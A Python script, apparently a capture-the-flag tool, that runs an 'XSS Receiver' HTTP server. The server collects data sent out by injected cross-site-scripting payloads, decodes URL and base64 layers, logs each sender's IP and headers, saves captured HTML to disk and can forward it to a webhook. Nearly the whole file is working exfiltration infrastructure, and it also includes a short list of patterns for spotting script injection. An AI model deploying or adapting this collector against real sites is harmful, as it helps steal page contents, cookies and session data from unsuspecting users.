#!/usr/bin/env python3
import argparse
import base64
import http.server
import ipaddress
import json
import logging
import re
import secrets
import socketserver
import ssl
import sys
import threading
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from time import time
from typing import Any, ClassVar

# Try importing requests, but don't crash if missing (standard CTF fallback)
try:
    import requests
except ImportError:
    requests = None

# --- Configuration & Enums ---

class LayerType(str, Enum):
    URL = "url"
    BASE64 = "b64"

class SecurityLevel(str, Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"

@dataclass
class Stats:
    total_requests: int = 0
    html_files_saved: int = 0
    blocked_requests: int = 0
    unique_ips: set[str] = field(default_factory=set)
    start_time: float = field(default_factory=time)

    def to_dict(self) -> dict[str, Any]:
        return {
            "total_requests": self.total_requests,
            "html_files_saved": self.html_files_saved,
            "blocked_requests": self.blocked_requests,
            "unique_ips": len(self.unique_ips),
            "uptime_seconds": round(time() - self.start_time, 2)
        }
    
    def add_request(self, ip: str, is_html: bool = False, blocked: bool = False) -> None:
        if blocked:
            self.blocked_requests += 1
        else:
            self.total_requests += 1
            self.unique_ips.add(ip)
            if is_html: self.html_files_saved += 1

@dataclass
class Config:
    port: int = 80
    show_html: bool = False
    show_all: bool = False
    show_full_preview: bool = False
    json_log: bool = False
    allowed_ips: set[str] | None = None
    max_depth: int = 5
    save_dir: Path = Path('decoded_html')
    rate_limit_requests: int = 100
    rate_limit_window: int = 60
    webhook_url: str | None = None
    ssl_cert: str | None = None
    ssl_key: str | None = None
    enable_stats: bool = True
    max_content_len: int = 10 * 1024 * 1024
    security_level: SecurityLevel = SecurityLevel.MEDIUM
    api_key: str | None = None
    log_level: str = "INFO"

# --- Core Logic Classes ---

class SecurityValidator:
    SUSPICIOUS = [
        re.compile(p, re.IGNORECASE | re.DOTALL) for p in [
            r'<script[^>]*>.*?</script>', r'javascript:', r'vbscript:',
            r'onload\s*=', r'onerror\s*=', r'eval\s*\(', r'document\.cookie', r'window\.location'
        ]
    ]

    def __init__(self, level: SecurityLevel):
        self.level = level

    def validate_ip(self, ip_str: str) -> bool:
        try:
            ip = ipaddress.ip_address(ip_str)
            if self.level == SecurityLevel.HIGH and (ip.is_private or ip.is_loopback):
                return False
            return True
        except ValueError:
            return False

    def validate_content(self, content: str) -> tuple[bool, list[str]]:
        if self.level == SecurityLevel.LOW: return True, []
        threats = [p.pattern for p in self.SUSPICIOUS if p.search(content)]
        return (len(threats) == 0 or self.level == SecurityLevel.MEDIUM), threats

class RateLimiter:
    def __init__(self, limit: int, window: int):
        self.limit = limit
        self.window = window
        self.requests: dict[str, list[float]] = defaultdict(list)
        self.lock = threading.Lock()

    def check(self, ip: str) -> bool:
        with self.lock:
            now = time()
            self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]
            if len(self.requests[ip]) >= self.limit: return False
            self.requests[ip].append(now)
            return True

    def get_stats(self) -> dict[str, int]:
        with self.lock:
            return {"active_ips": len(self.requests), "recent_reqs": sum(len(ts) for ts in self.requests.values())}

class Decoder:
    B64_REGEX = re.compile(r'^[A-Za-z0-9+/]{8,}={0,2}$')

    def __init__(self, max_depth: int):
        self.max_depth = max_depth

    def decode(self, data: str) -> tuple[str, list[tuple[LayerType, str]]]:
        if not data: return data, []
        layers: list[tuple[LayerType, str]] = []
        current = data

        for _ in range(self.max_depth):
            if len(current) > 10 * 1024 * 1024: break 
            
            # 1. Try URL Decode
            try:
                if (decoded := urllib.parse.unquote(current)) != current:
                    layers.append((LayerType.URL, decoded[:60]))
                    current = decoded
                    continue
            except Exception: pass

            # 2. Try Base64
            try:
                candidate = re.sub(r'\s+', '', current)
                if len(candidate) >= 8 and self.B64_REGEX.match(candidate):
                    # Fix padding
                    padding = candidate + '=' * (-len(candidate) % 4)
                    if (decoded_b64 := base64.b64decode(padding).decode('utf-8', 'replace')):
                        layers.append((LayerType.BASE64, decoded_b64[:60]))
                        current = decoded_b64
                        continue
            except Exception: pass
            break
        return current, layers

class FileManager:
    def __init__(self, save_dir: Path):
        self.save_dir = save_dir
        self.save_dir.mkdir(exist_ok=True, mode=0o750)
        self.lock = threading.Lock()

    def save(self, content: str, ts: str, ext: str) -> Path | None:
        fname = re.sub(r'[<>:"/\\|?*]', '_', ts)[:100]
        fpath = self.save_dir / f"{'decoded' if ext == 'html' else 'raw'}_{fname}.{ext}"
        try:
            # Security check: ensure path is inside save_dir
            if not fpath.resolve().is_relative_to(self.save_dir.resolve()): return None
            
            with self.lock:
                with fpath.open('w', encoding='utf-8') as f: f.write(content)
                fpath.chmod(0o640)
            return fpath
        except Exception as e:
            logging.error(f"Save failed: {e}")
            return None

    def log_json(self, entry: dict[str, Any]) -> None:
        try:
            with self.lock, (self.save_dir / 'log.jsonl').open('a', encoding='utf-8') as f:
                f.write(json.dumps(entry, default=str) + '\n')
        except Exception: pass

# --- HTTP Handler ---

class CTFReceiverHandler(http.server.SimpleHTTPRequestHandler):
    # Class-level dependency injection (Avoids __init__ conflict)
    cfg: ClassVar[Config]
    decoder: ClassVar[Decoder]
    files: ClassVar[FileManager]
    limiter: ClassVar[RateLimiter]
    stats: ClassVar[Stats]
    validator: ClassVar[SecurityValidator]

    def log_message(self, fmt: str, *args: Any) -> None:
        logging.info(f"{self.client_address[0]} - {fmt % args}")

    def _auth_check(self) -> bool:
        ip = self.client_address[0]
        if not self.validator.validate_ip(ip): return False
        if self.cfg.allowed_ips and ip not in self.cfg.allowed_ips: 
            return False
        if self.cfg.api_key and not secrets.compare_digest(self.cfg.api_key, self.headers.get('X-API-Key', '')): 
            return False
        if not self.limiter.check(ip):
            self.stats.add_request(ip, blocked=True)
            self.send_error(429, "Rate limit exceeded")
            return False
        return True

    def _process_payload(self, raw: str):
        if not raw or '=' not in raw: return
        key, _, val = raw.partition('=')
        val = urllib.parse.unquote(val)
        ip, ts = self.client_address[0], datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')

        # Decode & Validate
        final, layers = self.decoder.decode(val)
        is_safe, threats = self.validator.validate_content(final)
        
        if threats:
            logging.warning(f"Security threats from {ip}: {threats}")
            if not is_safe:
                self.stats.add_request(ip, blocked=True)
                return

        # Console Output
        preview_len = None if self.cfg.show_full_preview else 60
        logging.info(f"Raw ({key}) from {ip}: {val[:preview_len]}...")
        for i, (l_type, txt) in enumerate(layers, 1):
            logging.info(f"    Layer {i} ({l_type.value}): {txt[:preview_len]}...")
        
        is_html = '<html' in final.lower() or '<body' in final.lower()
        if self.cfg.show_all or (self.cfg.show_html and is_html):
            print(f"\n--- BEGIN CONTENT ({ip}) ---\n{final}\n--- END CONTENT ---")

        # Save to Disk
        self.files.save(raw, ts, 'txt')
        saved_path = self.files.save(final, ts, 'html') if is_html else None
        
        # Stats & Logs
        self.stats.add_request(ip, is_html)
        entry = {
            "timestamp": ts, "ip": ip, "headers": dict(self.headers),
            "layers": [f"{l[0]}:{l[1]}" for l in layers], 
            "final": final, "threats": threats, "saved_html": str(saved_path)
        }
        if self.cfg.json_log: self.files.log_json(entry)
        
        # Webhook
        if self.cfg.webhook_url and is_html and requests:
            try:
                requests.post(self.cfg.webhook_url, json={
                    "content": f"🚨 HTML captured from {ip}", 
                    "embeds": [{"title": "Preview", "description": f"```{final[:1000]}```"}]
                }, timeout=3)
            except Exception as e: logging.error(f"Webhook failed: {e}")

    def do_GET(self):
        if self.path == '/stats' and self.cfg.enable_stats:
            self.send_response(200); self.send_header('Content-Type', 'application/json'); self.end_headers()
            data = {**self.stats.to_dict(), "limiter": self.limiter.get_stats()}
            self.wfile.write(json.dumps(data, indent=2).encode())
            return
        
        if not self._auth_check(): return self.send_error(403)
        
        # Serve static files if allowed
        parsed = urllib.parse.urlsplit(self.path)
        p = Path(parsed.path.lstrip('/'))
        if p.name and p.is_file() and p.resolve().is_relative_to(Path.cwd()):
            return super().do_GET() 
            
        if parsed.query: self._process_payload(parsed.query)
        self.send_response(200); self.end_headers(); self.wfile.write(b'Success')

    def do_POST(self):
        if not self._auth_check(): return self.send_error(403)
        length = int(self.headers.get('Content-Length', 0))
        if length > self.cfg.max_content_len: return self.send_error(413)
        self._process_payload(self.rfile.read(length).decode('utf-8', 'replace'))
        self.send_response(200); self.end_headers(); self.wfile.write(b'Success')

# --- Main ---

def main():
    p = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    p.add_argument('--port', '-p', type=int, default=80)
    p.add_argument('--show', '-s', action='store_true', dest='show_html', help='Show HTML content')
    p.add_argument('--show-all', action='store_true', help='Show all decoded content')
    p.add_argument('--show-full-preview', action='store_true')
    p.add_argument('--json-log', action='store_true')
    p.add_argument('--allow-ip', nargs='*', default=None)
    p.add_argument('--security-level', choices=[l.value for l in SecurityLevel], default='medium')
    p.add_argument('--api-key')
    p.add_argument('--webhook-url')
    p.add_argument('--ssl-cert'); p.add_argument('--ssl-key')
    p.add_argument('--save-dir', default='decoded_html')
    p.add_argument('--rate-limit', type=int, default=100)
    p.add_argument('--rate-window', type=int, default=60)
    p.add_argument('--no-stats', action='store_true')
    p.add_argument('--log-level', default='INFO')
    args = p.parse_args()

    cfg = Config(
        port=args.port, show_html=args.show_html, show_all=args.show_all, 
        show_full_preview=args.show_full_preview, json_log=args.json_log,
        allowed_ips=set(args.allow_ip) if args.allow_ip else None,
        save_dir=Path(args.save_dir), webhook_url=args.webhook_url,
        ssl_cert=args.ssl_cert, ssl_key=args.ssl_key,
        enable_stats=not args.no_stats,
        security_level=SecurityLevel(args.security_level), api_key=args.api_key,
        rate_limit_requests=args.rate_limit, rate_limit_window=args.rate_window
    )

    logging.basicConfig(level=getattr(logging, args.log_level.upper()), 
                       format='[%(asctime)s] %(levelname)s: %(message)s')
    
    # Inject dependencies as class attributes (Fixes the __init__ crash)
    CTFReceiverHandler.cfg = cfg
    CTFReceiverHandler.decoder = Decoder(cfg.max_depth)
    CTFReceiverHandler.files = FileManager(cfg.save_dir)
    CTFReceiverHandler.limiter = RateLimiter(cfg.rate_limit_requests, cfg.rate_limit_window)
    CTFReceiverHandler.stats = Stats()
    CTFReceiverHandler.validator = SecurityValidator(cfg.security_level)

    server = socketserver.ThreadingTCPServer(('0.0.0.0', cfg.port), CTFReceiverHandler)
    # Enable address reuse to prevent "Address already in use" errors on restart
    server.allow_reuse_address = True

    if cfg.ssl_cert and cfg.ssl_key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cfg.ssl_cert, cfg.ssl_key)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print("🔒 SSL Enabled")

    print(f"[*] XSS Receiver listening on {cfg.port}")
    print(f"[*] Security: {cfg.security_level.value.upper()} | Save Dir: {cfg.save_dir}")
    try: server.serve_forever()
    except KeyboardInterrupt: print("\nStopping...")
    finally: server.server_close()

if __name__ == '__main__':
    main()
